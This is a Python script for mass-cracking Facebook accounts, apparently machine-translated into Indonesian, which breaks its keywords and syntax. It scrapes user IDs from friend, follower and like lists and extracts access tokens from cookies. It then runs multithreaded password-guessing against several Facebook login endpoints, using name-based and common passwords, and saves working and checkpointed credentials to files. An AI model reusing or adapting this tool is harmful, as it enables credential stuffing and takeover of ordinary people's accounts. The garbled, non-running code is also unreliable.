#coding=utf-8

Massage_Author = """

~~> Syarat Kode Sumber Terbuka? Subrek Channel Gua & Jangan Ganti Bot Follow! Cukup Tambah Bot Follow Sajah!

~~> Ingat Ini Hanya Untuk Contoh Project!. Kalo Mau Recode, Recode Ajah Itung² Buat Latihan Lu

~~> Kalo Mau Izin, Izin lewat instgrm/email/fb Ajah

~~> insgrm : https://www.instagram.com/ngemry7

~~> email : xgansb@gmail.com

~~> fb : https://www.facebook.com/meyrina.setyaningrum

~~> Maaf klo kodingnya berantakan dan banyak bug :)

"""



permintaan impor,bs4,sys,os,random,time,re,json
impor kalender,deku,orbxd
dari datetime impor datetime
dari tanggal impor datetime
dari bersamaan.futures mengimpor ThreadPoolExecutor
dari multiprocessing.pool impor ThreadPool
dari bs4 impor BeautifulSoup sebagai parser
isi ulang (sys)
sys.setdefaultencoding("utf-8")
jika 'linux' di sys.platform.lower():
    p = "\033[1;37m"
    b = "\033[1;36m"
    m = "\033[1;91m"
    j = "\033[1;32m"
kalau tidak:
    p = ""
    b = ""
    m = ""
    h = ""

mencoba:
    permintaan impor
kecuali ImportError:
    os.system('pip2 instal permintaan')
kalau tidak:
    mencoba:
        impor bs4
    kecuali ImportError:
        os.system('pip2 install bs4')
    kalau tidak:
        mencoba:
            impor bs4
        kecuali ImportError:
            os.system('pip2 install bs4')

def jalan(z):
	untuk e dalam z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		waktu.tidur(0.02)

lingkaran = 0
identitas = []
oke = []
cp = []

ct = datetime.now()
n = ct.bulan
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember" ]
mencoba:
	jika n < 0 atau n > 12:
		keluar()
	nTemp = n - 1
kecuali ValueError:
	keluar()

saat ini = datetime.now()
ta = sekarang.tahun
bu = sekarang.bulan
ha = hari ini.hari
op = bulan[nTemp]

tanggal_saya = tanggal.hari ini()
jam = calendar.day_name[tanggal_saya.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni" , "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

spanduk = ("""\033[1;37m
   ______\033[1;91m __ __ \033[1;37m __  
  / ____/ \033[1;91m / // / \033[1;37m _____ / /__
 / / \033[1;91m/ // /_ \033[1;37m / ___/ / //_/
/ /___ \033[1;91m/__ __/\033[1;37m / /__ / ,< Au \033[1;36m• \033[1;32mDekura-X.\033[1;37m
\____/ \033[1;91m /_/ \033[1;37m \___/ /_/|_|\n
  \033[1;33m•\033[1;91m•\033[1;37m Alat Baru Meretas Facebook Acak \033[1;33m•\033[1;91m•\033[1;37m]
 \033[1;33m•\033[1;91m•\033[1;37mGunakan Akun Tumbal Untuk Login! \033[1;33m•\033[1;91m•\033[1;37m""")

logo = """\033[1;37m
   ______\033[1;91m __ __ \033[1;37m __  
  / ____/ \033[1;91m / // / \033[1;37m _____ / /__
 / / \033[1;91m/ // /_ \033[1;37m / ___/ / //_/
/ /___ \033[1;91m/__ __/\033[1;37m / /__ / ,< Au \033[1;36m• \033[1;32mDekura-X.\033[1;37m
\____/ \033[1;91m /_/ \033[1;37m \___/ /_/|_|\n"""

jelas ():
	jika "linux" di sys.platform.lower():
		os.system("hapus")
	elif "menang" di sys.platform.lower():
		os.system("cls")
	lain:os.system("hapus")


subrek = random.choice(["https://youtube.com/c/orbXDBdbsS","https://youtube.com/channel/UCMlyT-T7FLXopriA9HDbXEQ"])

youtuber = subrek

############################################################# #####

def masuk():
    token global
    os.system("hapus");print(banner)
    print("\033[1;96m"+50*"-")
    print(" %s[%s1%s] Masuk melalui token\n%s [%s2%s] Masuk melalui cookie"%(p,b,p,p,b,p))
    pil_log=raw_input("\n%s [%s•%s] Pilih: "%(p,b,p))
    jika pil_log in ["1","01"]:
        log_token()
    elif pil_log di ["2","02"]:
        Kue kering()
    else:print("\n%s [%s!%s] Pilihan tidak ada!"%(p,m,p));time.sleep(1);login()


def log_token():
    token global
    os.system("hapus");print(logo)
    print("\033[1;96m"+50*"-")
    convert=raw_input("%s [%s•%s] Token: "%(p,b,p))
    mencoba:
        saya=requests.get('https://graph.facebook.com/me?access_token=%s'%(convert));open("login.txt",'w').write(convert)
        print("\n %s[%s•%s] Login berhasil"%(p,b,p));jalan(" %s[%s•%s] Silahkan Subscribe Channel Saya :)"%(p, b,p));os.system('xdg-buka %s'%(youtuber));keluar(deku.dekudesu())
    kecuali KeyError:
        print("\n %s[%s!%s] Token tidak valid!"%(p,m,p));time.sleep(1);login()

pembaruan def():
    print("\n %s[%s!%s] Menu sedang di update coeg!"%(p,m,p));time.sleep(1);login()

def cookie():
	memperbarui()
	os.system('clear');print(logo)
	print("\033[0;96m"+50*"-")
	cookie = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Cookie: ")
	mencoba:
		data = request.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent' : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
		'referer' : 'https://m.facebook.com/',
		'host' : 'm.facebook.com',
		'asal' : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control' : 'max-age=0',
		'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'tipe-konten' : 'teks/html; rangkaian karakter = utf-8'
		}, kue = {
		'kue': kue
		})
		find_token = re.search('(EAA\w+)', data.text)
		hasil = " \033[0;97m[\033[0;91m!\033[0;97m] Cookie Anda Tidak Valid" if (find_token is None) else '\n* Token akses fb Anda : ' + find_token.group( 1)
		#print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Cookie Tidak Valid")
		#waktu.tidur(1.5)
		#gurucowlies()
	kecuali request.exceptions.ConnectionError:
		print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Tidak Ada Sambungan")
	cookie = buka("login.txt", 'w')
	cookie.write(find_token.group(1))
	cookie.tutup()
	print("\n %s[%s•%s] Login berhasil"%(p,b,p));jalan(" %s[%s•%s] Silahkan Subscribe Channel Saya :)"%(p, b,p));os.system('xdg-buka %s'%(youtuber));keluar(deku.dekudesu())
menu def():
    mencoba:
        token = buka("login.txt","r").read()
        saya = request.get('https://graph.facebook.com/me/?access_token=%s'%(token))
        i = json.loads(saya.text)
        nick = saya['nama']
        idme = i['id']
        ttlme = i['ulang tahun']
        bulan, hari, tahun = ttlme.split("/")
        bulan = bulan_ttl[bulan]
    kecuali Pengecualian sebagai e:
        print ("\n %s[%s!%s] Token tidak valid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login( )
    os.system("hapus");print(logo)
    print("\033[1;96m"+50*"-")
    print("%s [%s•%s] Nama Panggilan : %s "%(p,b,p,nick));print("%s [%s•%s] ID facebook : %s "%(p ,b,p,idme));print("%s [%s•%s] Tanggal lahir : %s %s %s"%(p,b,p,hari,bulan,tahun))
    print("\033[1;96m"+50*"-")
    print("\n%s [%s01%s] Crack fb dari list teman sendiri "%(p,b,p))
    print("%s [%s02%s] Crack fb dari list teman publik "%(p,b,p))
    print("%s [%s03%s] Crack fb dari follower publik "%(p,b,p))
    print("%s [%s04%s] Crack fb dari like publik"%(p,b,p))
    print("%s [%s05%s] Crack fb massal publik"%(p,b,p))
    print("%s [%s06%s] Cek opsi akun sesi hasil crack"%(p,b,p))
    print("%s [%s07%s] Menyetel agen pengguna"%(p,b,p))
    print("%s [%s99%s] Cek hasil crack ok-cp"%(p,b,p))
    print("%s [%s00%s] Logout dari akun ini"%(p,b,p))
    pill = raw_input("\n%s [%s•%s] Pilih: "%(p,b,p))
    jika pil di ["1","01"]:
        teman()
        dekura_x()
    pil elif di ["2", "02"]:
        publik()
        dekura_x()
    pil elif di ["3","03"]:
        pengikut()
        dekura_x()
    pil elif di ["4","04"]:
        suka()
        dekura_x()
    pil elif di ["5", "05"]:
        massal()
        dekura_x()
    pil elif di ["6", "06"]:
        cek_opsi_sesi()
    pil elif di ["7", "07"]:
        pengaturan()
    pil elif di ["99"]:
        hasil()
    pil elif di ["0","00"]:
        os.system("rm -rf login.txt")
    else:print("\n%s [%s!%s] Pilihan tidak ada!"%(p,m,p));time.sleep(1);login()


def teman():
    token global
    mencoba:
        token = buka("login.txt", "r").read()
    kecuali IOError:
        print ("\n %s[%s!%s] Token tidak valid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login( )
    mencoba:
        untuk saya di request.get('https://graph.facebook.com/me/friends?access_token=%s'%(token)).json()["data"]:
            idne = i['id']
            jenenge = i["nama"]
            id.append(idne+'<=>'+jenenge)
    kecuali KeyError:
        exit('\n%s [%s!%s] Pertemanan tidak ada atau di private'%(p,m,p))
    if (len(id)) == 0:
        exit('\n%s [%s!%s] Maaf target pertemanan adalah 0'%(p,m,p))
    kalau tidak:
        print("\n%s [%s•%s] Jumlah id ~~> %s"%(p,b,p,(len(id))))


def publik():
    token global
    mencoba:
        token = buka("login.txt", "r").read()
    kecuali IOError:
        print ("\n %s[%s!%s] Token tidak valid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login( )
    idt=raw_input("\n%s [%s•%s] pasukan id target\n [%s•%s] ID target: "%(p,b,p,b,p))
    mencoba:
        untuk saya di request.get('https://graph.facebook.com/%s/friends?access_token=%s'%(idt,token)).json()["data"]:
            idne = i['id']
            jenenge = i["nama"]
            id.append(idne+'<=>'+jenenge)
    kecuali KeyError:
        exit('\n%s [%s!%s] Pertemanan tidak ada atau di private'%(p,m,p))
    if (len(id)) == 0:
        exit('\n%s [%s!%s] Maaf target pertemanan adalah 0'%(p,m,p))
    kalau tidak:
        print("\n%s [%s•%s] Jumlah id ~~> %s"%(p,b,p,(len(id))))


pasti pengikut():
    token global
    mencoba:
        token = buka("login.txt", "r").read()
    kecuali IOError:
        print ("\n %s[%s!%s] Token tidak valid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login( )
    idt=raw_input("\n%s [%s•%s] pasukan id target\n [%s•%s] ID target: "%(p,b,p,b,p))
    mencoba:
        untuk saya di request.get("https://graph.facebook.com/%s/subscribers?limit=20000&access_token=%s"%(idt,token)).json()["data"]:
            idne = i['id']
            jenenge = i["nama"]
            id.append(idne+'<=>'+jenenge)
    kecuali KeyError:
        exit('\n%s [%s!%s] Pengikut tidak ada atau di private'%(p,m,p))
    if (len(id)) == 0:
        exit('\n%s [%s!%s] Maaf, target pengikut adalah 0'%(p,m,p))
    kalau tidak:
        print("\n%s [%s•%s] Jumlah id ~~> %s"%(p,b,p,(len(id))))

pasti suka():
    token global
    mencoba:
        token = buka("login.txt", "r").read()
    kecuali IOError:
        print ("\n %s[%s!%s] Token tidak valid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login( )
    idt=raw_input("\n%s [%s•%s] Masukan id postingan\n [%s•%s] ID postingan target: "%(p,b,p,b,p))
    mencoba:
        untuk saya di request.get("https://graph.facebook.com/%s/likes?limit=100000&access_token=%s"%(idt,token)).json()["data"]:
            idne = i['id']
            jenenge = i["nama"]
            id.append(idne+'<=>'+jenenge)
    kecuali KeyError:
        exit('\n%s [%s!%s] Pengguna tidak suka ada atau di private'%(p,m,p))
    if (len(id)) == 0:
        exit('\n%s [%s!%s] Maaf suka target adalah 0'%(p,m,p))
    kalau tidak:
        print("\n%s [%s•%s] Jumlah id ~~> %s"%(p,b,p,(len(id))))

def massal():
	token global
	mencoba:
		token = buka("login.txt", "r").read()
	kecuali IOError:
		print ("\n %s[%s!%s] Token tidak valid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login( )
	mencoba:
		tanya_total = int(raw_input("\n%s [%s•%s] Jumlah massal: "%(p,b,p)))
	kecuali:tanya_total=1
	untuk t dalam jangkauan(tanya_total):
		t +1
		idt=raw_input("\n%s [%s•%s] pasukan id target\n [%s•%s] ID target%s: "%(p,b,p,b,p,t))
		mencoba:
			untuk saya di request.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				id = i["id"]
				jenenge = i["nama"]
				id.append(idne+"<=>"+jenenge)
		kecuali KeyError:
			exit('\n%s [%s!%s] Pertemanan tidak ada atau di private'%(p,m,p))
	if (len(id)) == 0:
		exit('\n%s [%s!%s] Maaf target pertemanan adalah 0'%(p,m,p))
	kalau tidak:
		print("\n%s [%s•%s] Jumlah id ~~> %s"%(p,b,p,(len(id))))

def dekura_x():
	print("\n%s [%s Pilih metode crack %s]%s"%(b,p,b,p))
	print("%s [%s1%s] Retak pake api.fb (%sfast%s)"%(p,b,p,b,p))
	print("%s [%s2%s] Crack pake mbasic.fb (%srekomendasi%s)"%(p,b,p,b,p))
	print("%s [%s3%s] Crack pake mobile.fb\n"%(p,b,p))
	dekurasayangara = raw_input("%s [%s•%s] Pilih: "%(p,b,p))
	jika dekurasayangara di [""]:
		exit("\n%s [%s!%s] Pilihan tidak boleh kosong!"%(p,m,p))
	elif dekurasayangara in ["1","01"]:
		bukanmaen = raw_input("%s [%s•%s] Crack With Pass Default/Manual [d/m]\n %s[%s•%s] Pilih: "%(p,b,p,p,b ,P))
		jika bukanmaen di ["m","M"]:
			dengan ThreadPoolExecutor(max_workers=30) sebagai coeg:
				asu = raw_input("%s [%s•%s] Contoh password: sayang, ganteng, cantik\n %s[%s•%s] Pass list: "%(p,b,p,p,b,p) )).membelah(",")
				jika len(asu) ="":
					exit("%s [%s!%s] Jangan kosong"%(p,m,p))
				print("\n%s [%s•%s] Hasil ok tersimpan di : ok.txt\n %s[%s•%s] Hasil cp tersimpan di : cp.txt"%(p,b,p, p, b, p))
				print("%s [%s•%s] Mode pesawat 5/10 detik jika tidak ada hasil!"%(p,b,p))
				untuk pengguna di id:
					uid, nama = user.split("<=>")
					coeg.submit(api, uid, asu)
			hasil()
		elif bukanmaen di ["d","D"]:
			dengan ThreadPoolExecutor(max_workers=30) sebagai coeg:
				print("\n%s [%s•%s] Hasil ok tersimpan di : ok.txt\n %s[%s•%s] Hasil cp tersimpan di : cp.txt"%(p,b,p, p, b, p))
				print("%s [%s•%s] Mode pesawat 5/10 detik jika tidak ada hasil!"%(p,b,p))
				untuk pengguna di id:
					uid, nama = user.split("<=>")
					frist=nama.split(" ")
					jika len(pertama)>=6:
						dekura = [ nama, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(pertama)<=2:
						dekura = [ nama, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(pertama)<=3:
						dekura = [ nama, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					kalau tidak:
						dekura = [ "sayang", "bissmilah", "anjing", "bangsat", "freefire", "katasandi", "indonesia", "sayangkamu" ]
					coeg.submit(api, uid, dekura)
			hasil()

	elif dekurasayangara == "2":
		bukanmaen = raw_input("%s [%s•%s] Crack With Pass Default/Manual [d/m]\n %s[%s•%s] Pilih: "%(p,b,p,p,b ,P))
		jika bukanmaen di ["m","M"]:
			dengan ThreadPoolExecutor(max_workers=30) sebagai coeg:
				asu = raw_input("%s [%s•%s] Contoh password: sayang, ganteng, cantik\n %s[%s•%s] Pass list: "%(p,b,p,p,b,p) )).membelah(",")
				jika len(asu) ="":
					exit("%s [%s!%s] Jangan kosong"%(p,m,p))
				print("\n%s [%s•%s] Hasil ok tersimpan di : ok.txt\n %s[%s•%s] Hasil cp tersimpan di : cp.txt"%(p,b,p, p, b, p))
				print("%s [%s•%s] Mode pesawat 5/10 detik jika tidak ada hasil!"%(p,b,p))
				untuk pengguna di id:
					uid, nama = user.split("<=>")
					coeg.submit(mbasic, uid, asu)
			hasil()
		elif bukanmaen == "d":
			dengan ThreadPoolExecutor(max_workers=35) sebagai coeg:
				print("\n%s [%s•%s] Hasil ok tersimpan di : ok.txt\n %s[%s•%s] Hasil cp tersimpan di : cp.txt"%(p,b,p, p, b, p))
				print("%s [%s•%s] Mode pesawat 5/10 detik jika tidak ada hasil!"%(p,b,p))
				untuk pengguna di id:
					uid, nama = user.split("<=>")
					frist=nama.split(" ")
					jika len(pertama)>=6:
						dekura = [ nama, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(pertama)<=2:
						dekura = [ nama, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(pertama)<=3:
						dekura = [ nama, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					kalau tidak:
						dekura = [ "sayang", "bissmilah", "anjing", "bangsat", "freefire", "katasandi", "indonesia", "sayangkamu" ]
					coeg.submit(basic, uid, dekura)
			hasil()

	elif dekurasayangara == "3":
		bukanmaen = raw_input("%s [%s•%s] Crack With Pass Default/Manual [d/m]\n %s[%s•%s] Pilih: "%(p,b,p,p,b ,P))
		jika bukanmaen di ["m","M"]:
			dengan ThreadPoolExecutor(max_workers=30) sebagai coeg:
				asu = raw_input("%s [%s•%s] Contoh password: sayang, ganteng, cantik\n %s[%s•%s] Pass list: "%(p,b,p,p,b,p) )).membelah(",")
				jika len(asu) ="":
					exit("%s [%s!%s] Jangan kosong"%(p,m,p))
				print("\n%s [%s•%s] Hasil ok tersimpan di : ok.txt\n %s[%s•%s] Hasil cp tersimpan di : cp.txt"%(p,b,p, p, b, p))
				print("%s [%s•%s] Mode pesawat 5/10 detik jika tidak ada hasil!"%(p,b,p))
				untuk pengguna di id:
					uid, nama = user.split("<=>")
					coeg.submit(freefb, uid, asu)
			hasil()
		elif bukanmaen == "d":
			dengan ThreadPoolExecutor(max_workers=30) sebagai coeg:
				print("\n%s [%s•%s] Hasil ok tersimpan di : ok.txt\n %s[%s•%s] Hasil cp tersimpan di : cp.txt"%(p,b,p, p, b, p))
				print("%s [%s•%s] Mode pesawat 5/10 detik jika tidak ada hasil!"%(p,b,p))
				untuk pengguna di id:
					uid, nama = user.split("<=>")
					frist=nama.split(" ")
					jika len(pertama)>=6:
						dekura = [ nama, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(pertama)<=2:
						dekura = [ nama, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(pertama)<=3:
						dekura = [ nama, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					kalau tidak:
						dekura = [ "sayang", "bissmilah", "anjing", "bangsat", "freefire", "katasandi", "indonesia", "sayangkamu" ]
					coeg.submit(mobile, uid, dekura)
			hasil()
		kalau tidak:
			exit("\n%s [%s!%s] Pilihan tidak ada!"%(p,m,p))

	kalau tidak:
		Tidak bisa()

### Api Cepat Crack ###

def api(uid, dekura):
	mencoba:
		ua = buka("ua", "r").read()
	kecuali IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA; FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r [Crack] %s/%s OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	untuk pw di dekura:
		pw = pw.bawah()
		ses = permintaan.Sesi()
		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x- fb-net-hni": str(random.randint(20000, 40000), "x-fb-connection-quality": "SANGAT BAIK", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", " user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
		kirim = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies = 1 & error_detail_type = button_with_disabled & source = device_based_login & meta_inf_fbmeta =% 20 & currently_logged_in_userid = 0 & method = GET & locale = en_US & client_country_code = US & fb_api_caller_class = com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler & access_token = 350.685.531.728 | 62f8ce9f74b12f84c123cc23437a4a32 & fb_api_req_friendly_name = mengotentikasi & cpl = true", header = headers_)
		jika "session_key" di send.text dan "EAA" di send.text:
			print("\r \x1b[1;32m[OK] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			buka("ok.txt","a").write("%s|%s\n"%(uid, pw))
			merusak
		elif "www.facebook.com" di send.json()["error_msg"]:
			mencoba:
				token = buka("login.txt", "r").read()
				dengan request.Session() sebagai ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					bulan, hari, tahun = ttl.split("/")
					bulan = bulan_ttl[bulan]
					print("\r\x1b[1;33m [CP] %s • %s • %s %s %s\033[0;97m"%(uid, pw, hari, bulan, tahun))
					cp.append("%s|%s"%(uid, pw))
					buka("cp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					buka("checkcp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					merusak
			kecuali (KeyError, IOError):
				hari = ("")
				bulan = ("")
				tahun = ("")
			kecuali: lulus
			print("\r\x1b[1;33m [CP] %s • %s\033[0;97m "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			buka("cp.txt","a").write("%s|%s\n"%(uid, pw))
			buka("checkcp.txt","a").write("%s|%s\n"%(uid, pw))
			merusak
		kalau tidak:
			melanjutkan

	lingkaran += 1

def mbasic(uid, dekura):
	mencoba:
		ua = buka("ua", "r").read()
	kecuali IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA; FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r [Crack] %s/%s OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	untuk pw di dekura:
		kwargs = {}
		pw = pw.bawah()
		ses = permintaan.Sesi()
		ses.headers.update({"Origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en; q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/ *;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8 ", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts",,"li",,"nomor_coba",,"unrecognized_tries","login"]
		untuk saya di b("masukan"):
			mencoba:
				if i.get("name") di bl:kwargs.update({i.get("name"):i.get("value")})
				lain: lanjutkan
			kecuali: lulus
		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": " ","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data = kwargs)
		jika "c_user" di ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (kunci, nilai) untuk kunci, nilai dalam ses.cookies.get_dict().items() ]).replace("noscript=1; ", "")
			print("\r \x1b[1;32m[OK] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			buka("ok.txt","a").write("%s|%s\n"%(uid, pw))
			merusak
		elif "checkpoint" di ses.cookies.get_dict().keys():
			mencoba:
				token = buka("login.txt", "r").read()
				dengan request.Session() sebagai ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					bulan, hari, tahun = ttl.split("/")
					bulan = bulan_ttl[bulan]
					print("\r\x1b[1;33m [CP] %s • %s • %s %s %s\033[0;97m"%(uid, pw, hari, bulan, tahun))
					cp.append("%s|%s"%(uid, pw))
					buka("cp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					buka("checkcp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					merusak
			kecuali (KeyError, IOError):
				hari = ("")
				bulan = ("")
				tahun = ("")
			kecuali: lulus
			print("\r\x1b[1;33m [CP] %s • %s\033[0;97m "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			buka("cp.txt","a").write("%s|%s\n"%(uid, pw))
			buka("checkcp.txt","a").write("%s|%s\n"%(uid, pw))
			merusak
		kalau tidak:
			melanjutkan

	lingkaran += 1

def mobile (uid, dekura):
	mencoba:
		ua = buka("ua", "r").read()
	kecuali IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA; FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r [Crack] %s/%s OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	untuk pw di dekura:
		kwargs = {}
		pw = pw.bawah()
		ses = permintaan.Sesi()
		ses.headers.update({"Origin": "https://touch.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en; q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/ *;q=0.8", "agen-pengguna": ua, "Host": "touch.facebook.com", "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8 ", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts",,"li",,"nomor_coba",,"unrecognized_tries","login"]
		untuk saya di b("masukan"):
			mencoba:
				if i.get("name") di bl:kwargs.update({i.get("name"):i.get("value")})
				lain: lanjutkan
			kecuali: lulus
		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": " ","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data = kwargs)
		jika "c_user" di ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (kunci, nilai) untuk kunci, nilai dalam ses.cookies.get_dict().items() ]).replace("noscript=1; ", "")
			print("\r \x1b[1;32m[OK] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			buka("ok.txt","a").write("%s|%s\n"%(uid, pw))
			merusak
		elif "checkpoint" di ses.cookies.get_dict().keys():
			mencoba:
				token = buka("login.txt", "r").read()
				dengan request.Session() sebagai ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					bulan, hari, tahun = ttl.split("/")
					bulan = bulan_ttl[bulan]
					print("\r\x1b[1;33m [CP] %s • %s • %s %s %s\033[0;97m"%(uid, pw, hari, bulan, tahun))
					cp.append("%s|%s"%(uid, pw))
					buka("cp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					buka("checkcp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					merusak
			kecuali (KeyError, IOError):
				hari = ("")
				bulan = ("")
				tahun = ("")
			kecuali: lulus
			print("\r\x1b[1;33m [CP] %s • %s\033[0;97m "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			buka("cp.txt","a").write("%s|%s\n"%(uid, pw))
			buka("checkcp.txt","a").write("%s|%s\n"%(uid, pw))
			merusak
		kalau tidak:
			melanjutkan

	lingkaran += 1

def hasil():
	jika len(ok) != 0 atau len(cp) != 0:
		exit(orbxd.awokawokaowkwawkwowksheheheiwoansvdejeike_dekura_sayang())
	kalau tidak:
		exit("\n%s [%s•%s] Lah? Kok Gak Dapat Hasil :v\n%s [%s!%s] Mau Gans Biar Dapat Hasil :v"%(p,b,p,p ,m,p))

def awokawokaowkwawkwowksheheheiwoansvdejeike_dekura_sayang():
    token global
    kotntodhsvsvsvsvsv = raw_input("\n %s[%s•%s] Periksa Sesi Akun Opsi? y/n\n%s [%s•%s] Pilih: "%(p,b,p,p,b, P))
    jika kotntodhsvsvsvsvsv di ["y","Y"]:
        pilihan_sesi()
    elif kotntodhsvsvsvsvsv di ["n","N"]:
        os.remove('checkcp.txt')
        Tidak bisa()
    kalau tidak:
        exit("\n%s [%s!%s] Pilihan tidak ada!"%(p,m,p))

# Cek Option Crack Langsung ###


def option_sesi():
	file = ("checkcp.txt")
	mencoba:
		buka_baju = buka(file, "r").readlines()
	kecuali IOError:
